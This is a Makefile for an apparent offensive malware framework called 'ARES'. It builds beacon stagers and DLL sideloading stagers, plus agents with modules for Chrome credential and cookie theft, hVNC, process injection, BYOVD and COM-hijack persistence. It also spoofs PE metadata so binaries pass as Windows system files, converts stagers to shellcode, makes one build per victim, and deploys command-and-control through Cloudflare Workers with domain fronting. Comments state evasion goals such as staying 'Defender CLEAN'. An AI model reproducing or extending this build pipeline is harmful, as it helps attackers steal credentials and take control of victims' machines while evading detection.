# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  ARES FRAMEWORK v4.0 â€” Master Makefile
#
#  Architecture: Stager + Modular Capabilities
#
#  Targets:
#    agent         â€” Full monolithic agent (280KB, legacy/dev)
#    agent-stager  â€” Minimal beacon stager (< 50KB, production)
#    agent-dll     â€” DLL stager for sideloading (< 50KB, production)
#    agent-minimal â€” Beacon + stealer only, no hVNC/SOCKS/BYOVD (~100KB)
#    agent-debug   â€” Full agent with verbose output
#    c2            â€” Go C2 server
#    harden        â€” Post-build PE hardening (rename, strip Rich, spoof TS)
#    all           â€” Build stager + full + harden
#    clean         â€” Remove build artifacts
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

CC       = gcc
CFLAGS   = -Wall -O2 -s -mwindows -fno-ident \
           -ffunction-sections -fdata-sections \
           -Wno-format-truncation -Wno-stringop-truncation \
           -Wno-unused-variable -Wno-unused-function \
           -Wno-unused-but-set-variable \
           -Wno-cpp -Wno-unknown-pragmas -Wno-format
# v3.7: Debug output is opt-in via -DARES_DEBUG (default = silent/production)
# For dev builds: make agent-debug

# â”€â”€ Per-build XOR key: random each build via gen_xor_key.py â”€â”€
# gen_xor_key.py outputs: -DCFG_XOR_KEY=0xNN
PYTHON    := $(firstword $(wildcard /usr/bin/python3 /usr/local/bin/python3 $(LOCALAPPDATA)/Python/bin/python3.14.exe))
XOR_KEY_FLAG := $(shell "$(PYTHON)" tools/gen_xor_key.py 2>/dev/null)
ifneq ($(XOR_KEY_FLAG),)
  CFLAGS += $(XOR_KEY_FLAG)
else
  $(warning [!] gen_xor_key.py failed - using fallback 0xB3)
  CFLAGS += -DCFG_XOR_KEY=0xB3
endif
LDFLAGS  = -Wl,--gc-sections,--stack,4194304,--dynamicbase,--nxcompat
INCLUDES = -I.

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Source file groups
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Full agent (legacy monolithic â€” 16 modules)
AGENT_FULL_SRC = agent/native/main.c \
            agent/native/core.c \
            agent/native/syscall.c \
            agent/native/stealer.c \
            agent/native/chrome_v20.c \
            agent/native/chrome_inject.c \
            agent/native/socks5.c \
            agent/native/hvnc.c \
            agent/native/inject.c \
            agent/native/persist.c \
            agent/native/byovd.c \
            agent/native/eprocess.c \
            agent/native/bof_loader.c \
            agent/native/domain_front.c \
            agent/native/stack_spoof.c \
            agent/native/cap_loader.c

# Minimal stager (v4.2 â€” beacon + C2 + dispatch + NATIVE STEALER)
# v4.2 FIX: Added stealer.c, chrome_v20.c, chrome_inject.c for native
# credential extraction. Removes PowerShell dependency entirely.
# Binary size: ~80KB (still small enough for deployment)
# Stager: beacon + native stealer (v4.2) -- production build
# NOTE: stealer.c + chrome_v20.c needed for Ares_StealChromeCreds/Cookies
# Dead drop: dead_drop.c needs -lwinhttp (already in AGENT_LIBS now)
STAGER_SRC = agent/native/stager.c \
             agent/native/core.c \
             agent/native/syscall.c \
             agent/native/inject.c \
             agent/native/stealer.c \
             agent/native/chrome_v20.c \
             agent/native/chrome_inject.c \
             agent/native/bof_loader.c \
             agent/native/domain_front.c \
             agent/native/dead_drop.c \
             agent/native/cap_loader.c \
             agent/native/stack_spoof.c

# Minimal agent (beacon + stealer, no hVNC/SOCKS/BYOVD)
AGENT_MIN_SRC = agent/native/main.c \
            agent/native/core.c \
            agent/native/syscall.c \
            agent/native/stealer.c \
            agent/native/chrome_v20.c \
            agent/native/chrome_inject.c \
            agent/native/inject.c \
            agent/native/persist.c \
            agent/native/bof_loader.c \
            agent/native/domain_front.c \
            agent/native/cap_loader.c

# Libraries (MINIMAL â€” sensitive DLLs loaded at runtime only)
# NOTE: winhttp loaded dynamically in dead_drop.c / stager.c — NOT linked statically
AGENT_LIBS = -lkernel32 -luser32 -lws2_32 -lgdi32 -luuid

# Output
BUILD_DIR  = build
AGENT_OUT  = $(BUILD_DIR)/ares_agent.exe
STAGER_OUT = $(BUILD_DIR)/stager.exe
STAGER_DLL = $(BUILD_DIR)/stager.dll
AGENT_MIN_OUT = $(BUILD_DIR)/ares_minimal.exe
C2_OUT     = $(BUILD_DIR)/ares_c2.exe
PROXY_OUT  = $(BUILD_DIR)/persist_proxy.dll

# â”€â”€ Targets â”€â”€

.PHONY: all agent agent-stager agent-dll agent-minimal agent-debug c2 strings clean proxy_dll harden harden-full srdi victim

all: agent-stager agent harden

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  v4.0: Minimal Stager (PRODUCTION â€” enterprise targets)
#  < 50KB, beacon-only, modules via C2
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
agent-stager: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) -DARES_STAGER_STEAL $(LDFLAGS) $(INCLUDES) -o $(STAGER_OUT) $(STAGER_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Stager built: $(STAGER_OUT)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  v4.0: DLL Stager (SIDELOADING â€” highest evasion)
#  Loaded by signed Microsoft EXE via DLL search order hijack
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
agent-dll: $(BUILD_DIR)
	$(CC) -shared $(CFLAGS) -DARES_DLL_STAGER -Wl,--gc-sections,--dynamicbase,--nxcompat \
	      $(INCLUDES) -o $(STAGER_DLL) $(STAGER_SRC) $(AGENT_LIBS)
	@echo [+] DLL stager built: $(STAGER_DLL) ($$(du -h $(STAGER_DLL) 2>/dev/null | cut -f1 || echo "?"))

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  v4.0: Minimal Agent (beacon + stealer only)
#  ~100KB, no hVNC/SOCKS/BYOVD overhead
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
agent-minimal: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) -DARES_MINIMAL_BUILD $(LDFLAGS) $(INCLUDES) \
	    -o $(AGENT_MIN_OUT) $(AGENT_MIN_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Minimal agent built: $(AGENT_MIN_OUT)

# ═══════════════════════════════════════════
#  Production: Beacon ONLY — NO stealer.c (Defender CLEAN)
#  Stealer delivered as COFF on-demand via C2 task
# ═══════════════════════════════════════════
PROD_SRC = agent/native/stager.c \
           agent/native/core.c \
           agent/native/syscall.c \
           agent/native/inject.c \
           agent/native/bof_loader.c \
           agent/native/domain_front.c \
           agent/native/dead_drop.c \
           agent/native/cap_loader.c \
           agent/native/stack_spoof.c \
           agent/native/chrome_stubs.c

PROD_OUT = $(BUILD_DIR)/ares_prod.exe
PROD_DLL = $(BUILD_DIR)/ares_prod.dll

agent-prod: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) $(LDFLAGS) $(INCLUDES) \
	    -o $(PROD_OUT) $(PROD_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Production beacon: $(PROD_OUT)

agent-prod-dll: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) -shared $(CFLAGS) -DARES_DLL_STAGER $(LDFLAGS) $(INCLUDES) \
	    -o $(PROD_DLL) $(PROD_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Production DLL: $(PROD_DLL)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Legacy: Full monolithic agent (dev/testing)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
agent: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) $(LDFLAGS) $(INCLUDES) -o $(AGENT_OUT) $(AGENT_FULL_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Full agent built: $(AGENT_OUT)

# Debug build with verbose output
agent-debug: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) -DARES_DEBUG $(LDFLAGS) $(INCLUDES) -o $(BUILD_DIR)/ares_debug.exe $(AGENT_FULL_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Debug agent built: $(BUILD_DIR)/ares_debug.exe

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Post-build PE hardening
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
harden:
	@"$(PYTHON)" tools/pe_spoof.py $(STAGER_OUT) -o $(BUILD_DIR)/SearchHost.exe 2>/dev/null || \
	 py tools/pe_spoof.py $(STAGER_OUT) -o $(BUILD_DIR)/SearchHost.exe 2>NUL || \
	 echo "[!] pe_spoof.py failed - skipping PE hardening"

# Harden with donor version info (clones PE metadata from legit binary)
harden-full:
	@"$(PYTHON)" tools/pe_spoof.py $(STAGER_OUT) -o $(BUILD_DIR)/SearchHost.exe \
		--donor C:/Windows/System32/RuntimeBroker.exe 2>/dev/null || \
	 py tools/pe_spoof.py $(STAGER_OUT) -o $(BUILD_DIR)/SearchHost.exe \
		--donor C:/Windows/System32/RuntimeBroker.exe 2>NUL || \
	 echo "[!] pe_spoof.py failed"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  sRDI: Convert DLL stager â†’ shellcode blob
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
srdi: agent-dll
	@"$(PYTHON)" tools/srdi_convert.py $(STAGER_DLL) -o $(BUILD_DIR)/stager.bin --xor-key 0x5A 2>/dev/null || \
	 py tools/srdi_convert.py $(STAGER_DLL) -o $(BUILD_DIR)/stager.bin --xor-key 0x5A 2>NUL
	@echo [+] Shellcode blob: $(BUILD_DIR)/stager.bin

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Per-victim build (unique hash per target)
#  Usage: make victim TARGET=WORKSTATION01 C2=c2.example.com CAMPAIGN=OP_GHOST
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
victim:
	@"$(PYTHON)" tools/builder_v4.py --c2 $(C2) --target $(TARGET) \
		--campaign $(CAMPAIGN) --full-pipeline 2>/dev/null || \
	 py tools/builder_v4.py --c2 $(C2) --target $(TARGET) \
		--campaign $(CAMPAIGN) --full-pipeline 2>NUL

# FIX-03: Proxy DLL for COM hijack persistence
proxy_dll: $(BUILD_DIR)
	$(CC) -shared -Wall -O2 -s -o $(PROXY_OUT) agent/native/persist_proxy_dll.c -lkernel32 -luser32
	@echo [+] Proxy DLL built: $(PROXY_OUT)

c2: $(BUILD_DIR)
	cd c2server && go build -ldflags="-s -w" -o ../$(C2_OUT) ./cmd/
	@echo [+] C2 server built: $(C2_OUT)

strings:
	@# Step 1: Generate random key
	$(eval KEY := $(shell "$(PYTHON)" tools/gen_xor_key.py 2>/dev/null | sed 's/-DCFG_XOR_KEY=//'))
	@# Step 2: Re-encode all strings with that key
	"$(PYTHON)" tools/gen_full_strings.py --key $(KEY) 2>/dev/null || \
	 py tools/gen_full_strings.py --key $(KEY) 2>NUL || true
	@echo [+] Encrypted strings generated with key $(KEY)

# Usage: make config C2=c2.example.com CAMPAIGN=OP_TEST
config:
	python tools/builder.py --c2 $(C2) --campaign $(CAMPAIGN) --output agent/native/ares_config.h 2>/dev/null || \
	py tools/builder.py --c2 $(C2) --campaign $(CAMPAIGN) --output agent/native/ares_config.h 2>NUL
	@echo [+] Campaign config generated

$(BUILD_DIR):
	@mkdir -p $(BUILD_DIR) 2>/dev/null || mkdir $(BUILD_DIR) 2>NUL || true

clean:
	rm -f $(AGENT_OUT) $(C2_OUT) $(STAGER_OUT) $(STAGER_DLL) $(AGENT_MIN_OUT) 2>/dev/null || \
	del /f $(AGENT_OUT) $(C2_OUT) $(STAGER_OUT) $(STAGER_DLL) $(AGENT_MIN_OUT) 2>NUL
	@echo [+] Cleaned

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  CLOUDFLARE DEPLOYMENT (v4.2 â€” replaces ngrok)
#
#  Setup:    make cf-setup
#  Deploy:   make deploy
#  Build:    make agent-cloudflare CF_WORKER=analytics-edge.xxx.workers.dev
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Cloudflare Worker hostname (set when building agent)
CF_WORKER ?= analytics-edge.your-account.workers.dev

# Deploy CF Worker relay (requires: npx wrangler login)
deploy-relay:
	@echo "[DEPLOY] Setting up Cloudflare Worker relay..."
	@echo "[*] Worker name: analytics-edge"
	@echo "[*] You will be prompted to set secrets (C2_BACKEND, RELAY_KEY)"
	cd c2-relay && npx wrangler deploy
	@echo ""
	@echo "[!] Set secrets (run these commands):"
	@echo "    cd c2-relay"
	@echo "    npx wrangler secret put C2_BACKEND"
	@echo "    npx wrangler secret put RELAY_KEY"
	@echo ""
	@echo "[+] Worker deployed!"

# Setup Cloudflare Tunnel (one-time)
cf-setup:
	@echo "[SETUP] Running Cloudflare Tunnel setup..."
	powershell -ExecutionPolicy Bypass -File setup_cloudflare_tunnel.ps1

# Start C2 + Cloudflare Tunnel
deploy: c2
	@echo "[DEPLOY] Starting C2 + Cloudflare Tunnel..."
	powershell -ExecutionPolicy Bypass -File start_c2_cloudflare.ps1

# Quick deploy (no tunnel login needed â€” temporary URL)
deploy-quick: c2
	@echo "[DEPLOY] Quick deploy with temporary tunnel..."
	powershell -ExecutionPolicy Bypass -File start_c2_cloudflare.ps1 -QuickTunnel

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Agent with Cloudflare Workers C2
#  Usage: make agent-cloudflare CF_WORKER=analytics-edge.xxx.workers.dev
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
agent-cloudflare: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) -DARES_STAGER_STEAL \
	      -DARES_C2_CLOUDFLARE \
	      -DC2_WORKER_HOST=L"\"$(CF_WORKER)\"" \
	      $(LDFLAGS) $(INCLUDES) -o $(BUILD_DIR)/stager_cf.exe $(STAGER_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] Cloudflare agent built: $(BUILD_DIR)/stager_cf.exe
	@echo [+] Worker target: $(CF_WORKER)

# Agent with domain fronting via Cloudflare custom domain
# Usage: make agent-cf-front CF_WORKER=analytics-edge.xxx.workers.dev CF_FRONT=cdn.legit-domain.com
CF_FRONT ?=
agent-cf-front: $(BUILD_DIR)
	@windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>/dev/null || \
	 windres agent/native/resources.rc -O coff -o $(BUILD_DIR)/resources.o 2>NUL || true
	$(CC) $(CFLAGS) -DARES_STAGER_STEAL \
	      -DARES_C2_CLOUDFLARE \
	      -DC2_WORKER_HOST=L"\"$(CF_WORKER)\"" \
	      -DCFG_CDN_SNI_0=L"\"$(CF_FRONT)\"" \
	      -DCFG_CDN_HOST_0=L"\"$(CF_WORKER)\"" \
	      -DCFG_CDN_PATH_0=L"\"\"" \
	      $(LDFLAGS) $(INCLUDES) -o $(BUILD_DIR)/stager_cf_front.exe $(STAGER_SRC) $(BUILD_DIR)/resources.o $(AGENT_LIBS)
	@echo [+] CF domain fronting agent built: $(BUILD_DIR)/stager_cf_front.exe
	@echo [+] Front domain: $(CF_FRONT) â†’ Worker: $(CF_WORKER)

